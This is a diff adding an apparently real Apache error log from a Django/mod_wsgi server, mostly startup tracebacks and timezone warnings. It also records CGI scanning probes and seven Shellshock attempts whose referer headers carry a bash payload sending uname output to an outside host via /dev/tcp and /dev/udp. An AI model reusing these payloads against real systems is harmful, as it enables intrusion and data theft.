@@ -1,0 +1,211 @@
+[Fri Jun 05 03:17:54.004819 2015] [:error] [pid 3411] [remote 190.213.19.27:204] mod_wsgi (pid=3411): Target WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py' cannot be loaded as Python module.
+[Fri Jun 05 03:17:54.004895 2015] [:error] [pid 3411] [remote 190.213.19.27:204] mod_wsgi (pid=3411): Exception occurred processing WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py'.
+[Fri Jun 05 03:17:54.004936 2015] [:error] [pid 3411] [remote 190.213.19.27:204] Traceback (most recent call last):
+[Fri Jun 05 03:17:54.004972 2015] [:error] [pid 3411] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py", line 14, in <module>
+[Fri Jun 05 03:17:54.005066 2015] [:error] [pid 3411] [remote 190.213.19.27:204]     application = get_wsgi_application()
+[Fri Jun 05 03:17:54.005092 2015] [:error] [pid 3411] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/core/wsgi.py", line 14, in get_wsgi_application
+[Fri Jun 05 03:17:54.005155 2015] [:error] [pid 3411] [remote 190.213.19.27:204]     django.setup()
+[Fri Jun 05 03:17:54.005177 2015] [:error] [pid 3411] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/__init__.py", line 21, in setup
+[Fri Jun 05 03:17:54.005234 2015] [:error] [pid 3411] [remote 190.213.19.27:204]     apps.populate(settings.INSTALLED_APPS)
+[Fri Jun 05 03:17:54.005256 2015] [:error] [pid 3411] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/apps/registry.py", line 85, in populate
+[Fri Jun 05 03:17:54.005395 2015] [:error] [pid 3411] [remote 190.213.19.27:204]     app_config = AppConfig.create(entry)
+[Fri Jun 05 03:17:54.005414 2015] [:error] [pid 3411] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/apps/config.py", line 87, in create
+[Fri Jun 05 03:17:54.005505 2015] [:error] [pid 3411] [remote 190.213.19.27:204]     module = import_module(entry)
+[Fri Jun 05 03:17:54.005528 2015] [:error] [pid 3411] [remote 190.213.19.27:204]   File "/usr/lib64/python2.7/importlib/__init__.py", line 37, in import_module
+[Fri Jun 05 03:17:54.005594 2015] [:error] [pid 3411] [remote 190.213.19.27:204]     __import__(name)
+[Fri Jun 05 03:17:54.005618 2015] [:error] [pid 3411] [remote 190.213.19.27:204] ImportError: No module named import_export
+[Fri Jun 05 03:17:54.239026 2015] [:error] [pid 3411] [remote 190.213.19.27:200] mod_wsgi (pid=3411): Target WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py' cannot be loaded as Python module.
+[Fri Jun 05 03:17:54.239086 2015] [:error] [pid 3411] [remote 190.213.19.27:200] mod_wsgi (pid=3411): Exception occurred processing WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py'.
+[Fri Jun 05 03:17:54.239193 2015] [:error] [pid 3411] [remote 190.213.19.27:200] Traceback (most recent call last):
+[Fri Jun 05 03:17:54.239247 2015] [:error] [pid 3411] [remote 190.213.19.27:200]   File "/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py", line 14, in <module>
+[Fri Jun 05 03:17:54.239316 2015] [:error] [pid 3411] [remote 190.213.19.27:200]     application = get_wsgi_application()
+[Fri Jun 05 03:17:54.239333 2015] [:error] [pid 3411] [remote 190.213.19.27:200]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/core/wsgi.py", line 14, in get_wsgi_application
+[Fri Jun 05 03:17:54.239362 2015] [:error] [pid 3411] [remote 190.213.19.27:200]     django.setup()
+[Fri Jun 05 03:17:54.239377 2015] [:error] [pid 3411] [remote 190.213.19.27:200]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/__init__.py", line 21, in setup
+[Fri Jun 05 03:17:54.239400 2015] [:error] [pid 3411] [remote 190.213.19.27:200]     apps.populate(settings.INSTALLED_APPS)
+[Fri Jun 05 03:17:54.239415 2015] [:error] [pid 3411] [remote 190.213.19.27:200]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/apps/registry.py", line 78, in populate
+[Fri Jun 05 03:17:54.239439 2015] [:error] [pid 3411] [remote 190.213.19.27:200]     raise RuntimeError("populate() isn't reentrant")
+[Fri Jun 05 03:17:54.239485 2015] [:error] [pid 3411] [remote 190.213.19.27:200] RuntimeError: populate() isn't reentrant
+[Fri Jun 05 03:17:54.335456 2015] [:error] [pid 3411] [remote 190.213.19.27:200] mod_wsgi (pid=3411): Target WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py' cannot be loaded as Python module.
+[Fri Jun 05 03:17:54.335512 2015] [:error] [pid 3411] [remote 190.213.19.27:200] mod_wsgi (pid=3411): Exception occurred processing WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py'.
+[Fri Jun 05 03:17:54.335544 2015] [:error] [pid 3411] [remote 190.213.19.27:200] Traceback (most recent call last):
+[Fri Jun 05 03:17:54.335589 2015] [:error] [pid 3411] [remote 190.213.19.27:200]   File "/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py", line 14, in <module>
+[Fri Jun 05 03:17:54.335643 2015] [:error] [pid 3411] [remote 190.213.19.27:200]     application = get_wsgi_application()
+[Fri Jun 05 03:17:54.335665 2015] [:error] [pid 3411] [remote 190.213.19.27:200]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/core/wsgi.py", line 14, in get_wsgi_application
+[Fri Jun 05 03:17:54.335698 2015] [:error] [pid 3411] [remote 190.213.19.27:200]     django.setup()
+[Fri Jun 05 03:17:54.335718 2015] [:error] [pid 3411] [remote 190.213.19.27:200]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/__init__.py", line 21, in setup
+[Fri Jun 05 03:17:54.335743 2015] [:error] [pid 3411] [remote 190.213.19.27:200]     apps.populate(settings.INSTALLED_APPS)
+[Fri Jun 05 03:17:54.335758 2015] [:error] [pid 3411] [remote 190.213.19.27:200]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/apps/registry.py", line 78, in populate
+[Fri Jun 05 03:17:54.335817 2015] [:error] [pid 3411] [remote 190.213.19.27:200]     raise RuntimeError("populate() isn't reentrant")
+[Fri Jun 05 03:17:54.335849 2015] [:error] [pid 3411] [remote 190.213.19.27:200] RuntimeError: populate() isn't reentrant
+[Fri Jun 05 03:19:58.716636 2015] [:error] [pid 3411] [remote 54.237.208.203:204] mod_wsgi (pid=3411): Target WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py' cannot be loaded as Python module.
+[Fri Jun 05 03:19:58.716716 2015] [:error] [pid 3411] [remote 54.237.208.203:204] mod_wsgi (pid=3411): Exception occurred processing WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py'.
+[Fri Jun 05 03:19:58.716743 2015] [:error] [pid 3411] [remote 54.237.208.203:204] Traceback (most recent call last):
+[Fri Jun 05 03:19:58.716773 2015] [:error] [pid 3411] [remote 54.237.208.203:204]   File "/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py", line 14, in <module>
+[Fri Jun 05 03:19:58.716815 2015] [:error] [pid 3411] [remote 54.237.208.203:204]     application = get_wsgi_application()
+[Fri Jun 05 03:19:58.716831 2015] [:error] [pid 3411] [remote 54.237.208.203:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/core/wsgi.py", line 14, in get_wsgi_application
+[Fri Jun 05 03:19:58.716857 2015] [:error] [pid 3411] [remote 54.237.208.203:204]     django.setup()
+[Fri Jun 05 03:19:58.716872 2015] [:error] [pid 3411] [remote 54.237.208.203:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/__init__.py", line 21, in setup
+[Fri Jun 05 03:19:58.716893 2015] [:error] [pid 3411] [remote 54.237.208.203:204]     apps.populate(settings.INSTALLED_APPS)
+[Fri Jun 05 03:19:58.716908 2015] [:error] [pid 3411] [remote 54.237.208.203:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/apps/registry.py", line 78, in populate
+[Fri Jun 05 03:19:58.716930 2015] [:error] [pid 3411] [remote 54.237.208.203:204]     raise RuntimeError("populate() isn't reentrant")
+[Fri Jun 05 03:19:58.716953 2015] [:error] [pid 3411] [remote 54.237.208.203:204] RuntimeError: populate() isn't reentrant
+[Fri Jun 05 03:25:21.380180 2015] [:error] [pid 3667] [remote 190.213.19.27:204] mod_wsgi (pid=3667): Target WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py' cannot be loaded as Python module.
+[Fri Jun 05 03:25:21.380249 2015] [:error] [pid 3667] [remote 190.213.19.27:204] mod_wsgi (pid=3667): Exception occurred processing WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py'.
+[Fri Jun 05 03:25:21.380289 2015] [:error] [pid 3667] [remote 190.213.19.27:204] Traceback (most recent call last):
+[Fri Jun 05 03:25:21.380325 2015] [:error] [pid 3667] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py", line 14, in <module>
+[Fri Jun 05 03:25:21.380423 2015] [:error] [pid 3667] [remote 190.213.19.27:204]     application = get_wsgi_application()
+[Fri Jun 05 03:25:21.380449 2015] [:error] [pid 3667] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/core/wsgi.py", line 14, in get_wsgi_application
+[Fri Jun 05 03:25:21.380514 2015] [:error] [pid 3667] [remote 190.213.19.27:204]     django.setup()
+[Fri Jun 05 03:25:21.380537 2015] [:error] [pid 3667] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/__init__.py", line 21, in setup
+[Fri Jun 05 03:25:21.380593 2015] [:error] [pid 3667] [remote 190.213.19.27:204]     apps.populate(settings.INSTALLED_APPS)
+[Fri Jun 05 03:25:21.380616 2015] [:error] [pid 3667] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/apps/registry.py", line 85, in populate
+[Fri Jun 05 03:25:21.380757 2015] [:error] [pid 3667] [remote 190.213.19.27:204]     app_config = AppConfig.create(entry)
+[Fri Jun 05 03:25:21.380776 2015] [:error] [pid 3667] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/apps/config.py", line 87, in create
+[Fri Jun 05 03:25:21.380867 2015] [:error] [pid 3667] [remote 190.213.19.27:204]     module = import_module(entry)
+[Fri Jun 05 03:25:21.380891 2015] [:error] [pid 3667] [remote 190.213.19.27:204]   File "/usr/lib64/python2.7/importlib/__init__.py", line 37, in import_module
+[Fri Jun 05 03:25:21.380958 2015] [:error] [pid 3667] [remote 190.213.19.27:204]     __import__(name)
+[Fri Jun 05 03:25:21.380984 2015] [:error] [pid 3667] [remote 190.213.19.27:204] ImportError: No module named import_export
+[Fri Jun 05 03:25:21.577795 2015] [:error] [pid 3667] [remote 190.213.19.27:200] mod_wsgi (pid=3667): Target WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py' cannot be loaded as Python module.
+[Fri Jun 05 03:25:21.577841 2015] [:error] [pid 3667] [remote 190.213.19.27:200] mod_wsgi (pid=3667): Exception occurred processing WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py'.
+[Fri Jun 05 03:25:21.577867 2015] [:error] [pid 3667] [remote 190.213.19.27:200] Traceback (most recent call last):
+[Fri Jun 05 03:25:21.577904 2015] [:error] [pid 3667] [remote 190.213.19.27:200]   File "/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py", line 14, in <module>
+[Fri Jun 05 03:25:21.577953 2015] [:error] [pid 3667] [remote 190.213.19.27:200]     application = get_wsgi_application()
+[Fri Jun 05 03:25:21.577969 2015] [:error] [pid 3667] [remote 190.213.19.27:200]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/core/wsgi.py", line 14, in get_wsgi_application
+[Fri Jun 05 03:25:21.577997 2015] [:error] [pid 3667] [remote 190.213.19.27:200]     django.setup()
+[Fri Jun 05 03:25:21.578011 2015] [:error] [pid 3667] [remote 190.213.19.27:200]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/__init__.py", line 21, in setup
+[Fri Jun 05 03:25:21.578033 2015] [:error] [pid 3667] [remote 190.213.19.27:200]     apps.populate(settings.INSTALLED_APPS)
+[Fri Jun 05 03:25:21.578048 2015] [:error] [pid 3667] [remote 190.213.19.27:200]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/apps/registry.py", line 78, in populate
+[Fri Jun 05 03:25:21.578070 2015] [:error] [pid 3667] [remote 190.213.19.27:200]     raise RuntimeError("populate() isn't reentrant")
+[Fri Jun 05 03:25:21.578093 2015] [:error] [pid 3667] [remote 190.213.19.27:200] RuntimeError: populate() isn't reentrant
+[Fri Jun 05 03:25:21.676773 2015] [:error] [pid 3667] [remote 190.213.19.27:200] mod_wsgi (pid=3667): Target WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py' cannot be loaded as Python module.
+[Fri Jun 05 03:25:21.676820 2015] [:error] [pid 3667] [remote 190.213.19.27:200] mod_wsgi (pid=3667): Exception occurred processing WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py'.
+[Fri Jun 05 03:25:21.676846 2015] [:error] [pid 3667] [remote 190.213.19.27:200] Traceback (most recent call last):
+[Fri Jun 05 03:25:21.676881 2015] [:error] [pid 3667] [remote 190.213.19.27:200]   File "/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py", line 14, in <module>
+[Fri Jun 05 03:25:21.676922 2015] [:error] [pid 3667] [remote 190.213.19.27:200]     application = get_wsgi_application()
+[Fri Jun 05 03:25:21.676943 2015] [:error] [pid 3667] [remote 190.213.19.27:200]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/core/wsgi.py", line 14, in get_wsgi_application
+[Fri Jun 05 03:25:21.676971 2015] [:error] [pid 3667] [remote 190.213.19.27:200]     django.setup()
+[Fri Jun 05 03:25:21.676990 2015] [:error] [pid 3667] [remote 190.213.19.27:200]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/__init__.py", line 21, in setup
+[Fri Jun 05 03:25:21.677013 2015] [:error] [pid 3667] [remote 190.213.19.27:200]     apps.populate(settings.INSTALLED_APPS)
+[Fri Jun 05 03:25:21.677028 2015] [:error] [pid 3667] [remote 190.213.19.27:200]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/apps/registry.py", line 78, in populate
+[Fri Jun 05 03:25:21.677051 2015] [:error] [pid 3667] [remote 190.213.19.27:200]     raise RuntimeError("populate() isn't reentrant")
+[Fri Jun 05 03:25:21.677074 2015] [:error] [pid 3667] [remote 190.213.19.27:200] RuntimeError: populate() isn't reentrant
+[Fri Jun 05 03:26:51.132777 2015] [:error] [pid 3667] [remote 190.213.19.27:204] mod_wsgi (pid=3667): Target WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py' cannot be loaded as Python module.
+[Fri Jun 05 03:26:51.132824 2015] [:error] [pid 3667] [remote 190.213.19.27:204] mod_wsgi (pid=3667): Exception occurred processing WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py'.
+[Fri Jun 05 03:26:51.132850 2015] [:error] [pid 3667] [remote 190.213.19.27:204] Traceback (most recent call last):
+[Fri Jun 05 03:26:51.132887 2015] [:error] [pid 3667] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py", line 14, in <module>
+[Fri Jun 05 03:26:51.132931 2015] [:error] [pid 3667] [remote 190.213.19.27:204]     application = get_wsgi_application()
+[Fri Jun 05 03:26:51.132947 2015] [:error] [pid 3667] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/core/wsgi.py", line 14, in get_wsgi_application
+[Fri Jun 05 03:26:51.132974 2015] [:error] [pid 3667] [remote 190.213.19.27:204]     django.setup()
+[Fri Jun 05 03:26:51.132989 2015] [:error] [pid 3667] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/__init__.py", line 21, in setup
+[Fri Jun 05 03:26:51.133010 2015] [:error] [pid 3667] [remote 190.213.19.27:204]     apps.populate(settings.INSTALLED_APPS)
+[Fri Jun 05 03:26:51.133025 2015] [:error] [pid 3667] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/apps/registry.py", line 78, in populate
+[Fri Jun 05 03:26:51.133047 2015] [:error] [pid 3667] [remote 190.213.19.27:204]     raise RuntimeError("populate() isn't reentrant")
+[Fri Jun 05 03:26:51.133070 2015] [:error] [pid 3667] [remote 190.213.19.27:204] RuntimeError: populate() isn't reentrant
+[Fri Jun 05 03:26:51.314795 2015] [:error] [pid 3667] [remote 190.213.19.27:56268] mod_wsgi (pid=3667): Target WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py' cannot be loaded as Python module.
+[Fri Jun 05 03:26:51.314833 2015] [:error] [pid 3667] [remote 190.213.19.27:56268] mod_wsgi (pid=3667): Exception occurred processing WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py'.
+[Fri Jun 05 03:26:51.314879 2015] [:error] [pid 3667] [remote 190.213.19.27:56268] Traceback (most recent call last):
+[Fri Jun 05 03:26:51.314917 2015] [:error] [pid 3667] [remote 190.213.19.27:56268]   File "/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py", line 14, in <module>
+[Fri Jun 05 03:26:51.314958 2015] [:error] [pid 3667] [remote 190.213.19.27:56268]     application = get_wsgi_application()
+[Fri Jun 05 03:26:51.314974 2015] [:error] [pid 3667] [remote 190.213.19.27:56268]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/core/wsgi.py", line 14, in get_wsgi_application
+[Fri Jun 05 03:26:51.315002 2015] [:error] [pid 3667] [remote 190.213.19.27:56268]     django.setup()
+[Fri Jun 05 03:26:51.315029 2015] [:error] [pid 3667] [remote 190.213.19.27:56268]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/__init__.py", line 21, in setup
+[Fri Jun 05 03:26:51.315061 2015] [:error] [pid 3667] [remote 190.213.19.27:56268]     apps.populate(settings.INSTALLED_APPS)
+[Fri Jun 05 03:26:51.315077 2015] [:error] [pid 3667] [remote 190.213.19.27:56268]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/apps/registry.py", line 78, in populate
+[Fri Jun 05 03:26:51.315100 2015] [:error] [pid 3667] [remote 190.213.19.27:56268]     raise RuntimeError("populate() isn't reentrant")
+[Fri Jun 05 03:26:51.315126 2015] [:error] [pid 3667] [remote 190.213.19.27:56268] RuntimeError: populate() isn't reentrant
+[Fri Jun 05 03:26:51.420880 2015] [:error] [pid 3667] [remote 190.213.19.27:204] mod_wsgi (pid=3667): Target WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py' cannot be loaded as Python module.
+[Fri Jun 05 03:26:51.420922 2015] [:error] [pid 3667] [remote 190.213.19.27:204] mod_wsgi (pid=3667): Exception occurred processing WSGI script '/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py'.
+[Fri Jun 05 03:26:51.420950 2015] [:error] [pid 3667] [remote 190.213.19.27:204] Traceback (most recent call last):
+[Fri Jun 05 03:26:51.420982 2015] [:error] [pid 3667] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/WebConfSite/WebConfSite/wsgi.py", line 14, in <module>
+[Fri Jun 05 03:26:51.421024 2015] [:error] [pid 3667] [remote 190.213.19.27:204]     application = get_wsgi_application()
+[Fri Jun 05 03:26:51.421039 2015] [:error] [pid 3667] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/core/wsgi.py", line 14, in get_wsgi_application
+[Fri Jun 05 03:26:51.421065 2015] [:error] [pid 3667] [remote 190.213.19.27:204]     django.setup()
+[Fri Jun 05 03:26:51.421080 2015] [:error] [pid 3667] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/__init__.py", line 21, in setup
+[Fri Jun 05 03:26:51.421101 2015] [:error] [pid 3667] [remote 190.213.19.27:204]     apps.populate(settings.INSTALLED_APPS)
+[Fri Jun 05 03:26:51.421115 2015] [:error] [pid 3667] [remote 190.213.19.27:204]   File "/var/www/PyDev/WebConf/lib/python2.7/site-packages/django/apps/registry.py", line 78, in populate
+[Fri Jun 05 03:26:51.421137 2015] [:error] [pid 3667] [remote 190.213.19.27:204]     raise RuntimeError("populate() isn't reentrant")
+[Fri Jun 05 03:26:51.421160 2015] [:error] [pid 3667] [remote 190.213.19.27:204] RuntimeError: populate() isn't reentrant
+[Fri Jun 05 03:32:07.230036 2015] [:error] [pid 3904] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-06-05 03:32:07.227936) while time zone support is active.
+[Fri Jun 05 03:32:07.230091 2015] [:error] [pid 3904]   RuntimeWarning)
+[Fri Jun 05 03:32:07.230099 2015] [:error] [pid 3904] 
+[Fri Jun 05 03:32:12.550580 2015] [:error] [pid 3904] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-06-05 03:32:12.549994) while time zone support is active.
+[Fri Jun 05 03:32:12.550719 2015] [:error] [pid 3904]   RuntimeWarning)
+[Fri Jun 05 03:32:12.550923 2015] [:error] [pid 3904] 
+[Fri Jun 05 15:53:21.884457 2015] [cgi:error] [pid 4354] [client 203.162.15.233:51215] script not found or unable to stat: /var/www/cgi-bin/php
+[Fri Jun 05 15:53:22.543947 2015] [cgi:error] [pid 4390] [client 203.162.15.233:51242] script not found or unable to stat: /var/www/cgi-bin/php5
+[Fri Jun 05 15:53:23.208629 2015] [cgi:error] [pid 4395] [client 203.162.15.233:51264] script not found or unable to stat: /var/www/cgi-bin/php-cgi
+[Wed Jun 10 18:48:56.752159 2015] [:error] [pid 18829] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-06-10 18:48:56.750648) while time zone support is active.
+[Wed Jun 10 18:48:56.753060 2015] [:error] [pid 18829]   RuntimeWarning)
+[Wed Jun 10 18:48:56.753070 2015] [:error] [pid 18829] 
+[Wed Jun 10 18:49:01.469188 2015] [:error] [pid 18829] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-06-10 18:49:01.468688) while time zone support is active.
+[Wed Jun 10 18:49:01.469228 2015] [:error] [pid 18829]   RuntimeWarning)
+[Wed Jun 10 18:49:01.469235 2015] [:error] [pid 18829] 
+[Wed Jun 10 18:49:08.241132 2015] [:error] [pid 18829] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-06-10 18:49:08.240265) while time zone support is active.
+[Wed Jun 10 18:49:08.241190 2015] [:error] [pid 18829]   RuntimeWarning)
+[Wed Jun 10 18:49:08.241202 2015] [:error] [pid 18829] 
+[Wed Jun 10 18:56:51.584710 2015] [:error] [pid 19047] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-06-10 18:56:51.583180) while time zone support is active.
+[Wed Jun 10 18:56:51.585613 2015] [:error] [pid 19047]   RuntimeWarning)
+[Wed Jun 10 18:56:51.585623 2015] [:error] [pid 19047] 
+[Wed Jun 17 18:03:22.316529 2015] [cgi:error] [pid 19498] [client 94.102.49.169:49330] script not found or unable to stat: /var/www/cgi-bin/rtpd.cgi
+[Wed Jun 17 20:31:19.151178 2015] [cgi:error] [pid 32386] [client 213.165.70.245:39165] script not found or unable to stat: /var/www/cgi-bin/bash, referer: () { :;}; /bin/bash -c "echo 72.14.176.217/cgi-bin/bash  > /dev/tcp/74.208.79.34/21; /bin/uname -a > /dev/tcp/74.208.79.34/21; echo 72.14.176.217/cgi-bin/bash > /dev/udp/74.208.79.34/21"
+[Thu Jun 18 12:20:11.521376 2015] [cgi:error] [pid 19585] [client 213.165.70.245:45339] script not found or unable to stat: /var/www/cgi-bin/contact.cgi, referer: () { :;}; /bin/bash -c "echo 72.14.176.217/cgi-bin/contact.cgi  > /dev/tcp/74.208.79.34/21; /bin/uname -a > /dev/tcp/74.208.79.34/21; echo 72.14.176.217/cgi-bin/contact.cgi > /dev/udp/74.208.79.34/21"
+[Fri Jun 19 05:53:47.514552 2015] [cgi:error] [pid 19585] [client 213.165.70.245:40608] script not found or unable to stat: /var/www/cgi-bin/defaultwebpage.cgi, referer: () { :;}; /bin/bash -c "echo 72.14.176.217/cgi-bin/defaultwebpage.cgi  > /dev/tcp/74.208.79.34/21; /bin/uname -a > /dev/tcp/74.208.79.34/21; echo 72.14.176.217/cgi-bin/defaultwebpage.cgi > /dev/udp/74.208.79.34/21"
+[Fri Jun 19 21:21:29.310416 2015] [cgi:error] [pid 19584] [client 213.165.70.245:40490] script not found or unable to stat: /var/www/cgi-bin/env.cgi, referer: () { :;}; /bin/bash -c "echo 72.14.176.217/cgi-bin/env.cgi  > /dev/tcp/74.208.79.34/21; /bin/uname -a > /dev/tcp/74.208.79.34/21; echo 72.14.176.217/cgi-bin/env.cgi > /dev/udp/74.208.79.34/21"
+[Sat Jun 20 12:15:52.293492 2015] [cgi:error] [pid 19587] [client 213.165.70.245:42244] script not found or unable to stat: /var/www/cgi-bin/fire.cgi, referer: () { :;}; /bin/bash -c "echo 72.14.176.217/cgi-bin/fire.cgi  > /dev/tcp/74.208.79.34/21; /bin/uname -a > /dev/tcp/74.208.79.34/21; echo 72.14.176.217/cgi-bin/fire.cgi > /dev/udp/74.208.79.34/21"
+[Sun Jun 21 03:21:52.806961 2015] [cgi:error] [pid 19584] [client 213.165.70.245:49499] script not found or unable to stat: /var/www/cgi-bin/forum.cgi, referer: () { :;}; /bin/bash -c "echo 72.14.176.217/cgi-bin/forum.cgi  > /dev/tcp/74.208.79.34/21; /bin/uname -a > /dev/tcp/74.208.79.34/21; echo 72.14.176.217/cgi-bin/forum.cgi > /dev/udp/74.208.79.34/21"
+[Sun Jun 21 19:24:43.779792 2015] [cgi:error] [pid 19587] [client 213.165.70.245:33761] script not found or unable to stat: /var/www/cgi-bin/hello.cgi, referer: () { :;}; /bin/bash -c "echo 72.14.176.217/cgi-bin/hello.cgi  > /dev/tcp/74.208.79.34/21; /bin/uname -a > /dev/tcp/74.208.79.34/21; echo 72.14.176.217/cgi-bin/hello.cgi > /dev/udp/74.208.79.34/21"
+[Mon Jun 22 11:55:41.456155 2015] [cgi:error] [pid 19587] [client 213.165.70.245:44637] script not found or unable to stat: /var/www/cgi-bin/index.cgi, referer: () { :;}; /bin/bash -c "echo 72.14.176.217/cgi-bin/index.cgi  > /dev/tcp/74.208.79.34/21; /bin/uname -a > /dev/tcp/74.208.79.34/21; echo 72.14.176.217/cgi-bin/index.cgi > /dev/udp/74.208.79.34/21"
+[Sun Jun 28 08:23:08.721443 2015] [cgi:error] [pid 19587] [client 94.102.49.169:60934] script not found or unable to stat: /var/www/cgi-bin/rtpd.cgi
+[Mon Jun 29 07:34:07.164390 2015] [cgi:error] [pid 32386] [client 69.64.46.86:65535] script not found or unable to stat: /var/www/cgi-bin/rtpd.cgi
+[Mon Jun 29 18:18:19.263210 2015] [cgi:error] [pid 25031] [client 104.193.9.236:41079] script not found or unable to stat: /var/www/cgi-bin/login.cgi
+[Mon Jun 29 18:41:22.774293 2015] [cgi:error] [pid 14334] [client 104.193.9.236:58816] script not found or unable to stat: /var/www/cgi-bin/login.cgi
+[Mon Jun 29 23:26:27.406554 2015] [cgi:error] [pid 27839] [client 104.193.9.236:47978] script not found or unable to stat: /var/www/cgi-bin/diagnostic.cgi
+[Thu Jul 09 23:46:22.649582 2015] [:error] [pid 19496] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-07-09 23:46:22.642999) while time zone support is active.
+[Thu Jul 09 23:46:22.650860 2015] [:error] [pid 19496]   RuntimeWarning)
+[Thu Jul 09 23:46:22.650880 2015] [:error] [pid 19496] 
+[Thu Jul 09 23:46:30.902209 2015] [:error] [pid 19496] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-07-09 23:46:30.901430) while time zone support is active.
+[Thu Jul 09 23:46:30.902274 2015] [:error] [pid 19496]   RuntimeWarning)
+[Thu Jul 09 23:46:30.902286 2015] [:error] [pid 19496] 
+[Thu Jul 09 23:48:13.549456 2015] [:error] [pid 19496] /var/www/PyDev/WebConf/lib/python2.7/site-packages/django/db/models/fields/__init__.py:1278: RuntimeWarning: DateTimeField ManagedSession.Timestamp received a naive datetime (2015-07-09 23:48:13.548847) while time zone support is active.
